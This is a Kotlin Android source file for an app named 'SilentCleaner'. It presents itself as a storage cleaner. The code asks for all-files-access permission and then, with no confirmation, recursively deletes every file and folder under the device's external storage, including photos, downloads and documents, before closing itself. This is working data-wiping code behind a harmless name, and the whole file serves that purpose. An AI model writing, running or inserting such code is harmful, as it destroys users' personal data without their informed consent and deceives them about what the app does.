package com.silentcleaner.app

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    
    companion object {
        private const val TAG = "SilentCleaner"
        private const val REQUEST_MANAGE_STORAGE = 1001
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Set a minimal black background
        setContentView(android.R.layout.simple_list_item_1)
        
        // Check and request storage permission
        requestStoragePermission()
    }
    
    private fun requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Log.d(TAG, "Requesting MANAGE_EXTERNAL_STORAGE permission")
                val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                startActivityForResult(intent, REQUEST_MANAGE_STORAGE)
            } else {
                // We already have permission, proceed to delete files
                performCleanup()
            }
        } else {
            // For devices below Android 11, just exit as we'd need a different permission scheme
            Log.d(TAG, "Device running Android below 11, exiting...")
            finish()
        }
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == REQUEST_MANAGE_STORAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                Log.d(TAG, "MANAGE_EXTERNAL_STORAGE permission granted")
                performCleanup()
            } else {
                Log.d(TAG, "Permission denied, exiting...")
                finish()
            }
        }
    }
    
    private fun performCleanup() {
        Log.d(TAG, "Starting cleanup operation...")
        
        thread {
            try {
                val sdcard = Environment.getExternalStorageDirectory()
                Log.d(TAG, "Storage directory: ${sdcard.absolutePath}")
                
                // Delete all files and directories under /sdcard/
                deleteRecursively(sdcard)
                
                Log.d(TAG, "Cleanup completed, exiting...")
            } catch (e: Exception) {
                Log.e(TAG, "Error during cleanup: ${e.message}", e)
            } finally {
                // Ensure we exit the app when done
                runOnUiThread {
                    finish()
                }
            }
        }
    }
    
    private fun deleteRecursively(fileOrDirectory: File) {
        if (fileOrDirectory.isDirectory) {
            val files = fileOrDirectory.listFiles() ?: return
            for (child in files) {
                try {
                    deleteRecursively(child)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to delete: ${child.absolutePath}", e)
                }
            }
        }
        
        // Don't delete the root directory itself, just its contents
        if (fileOrDirectory.absolutePath != Environment.getExternalStorageDirectory().absolutePath) {
            try {
                if (fileOrDirectory.exists()) {
                    val deleted = fileOrDirectory.delete()
                    if (deleted) {
                        Log.d(TAG, "Deleted: ${fileOrDirectory.absolutePath}")
                    } else {
                        Log.d(TAG, "Failed to delete: ${fileOrDirectory.absolutePath}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error deleting ${fileOrDirectory.absolutePath}: ${e.message}", e)
            }
        }
    }
}
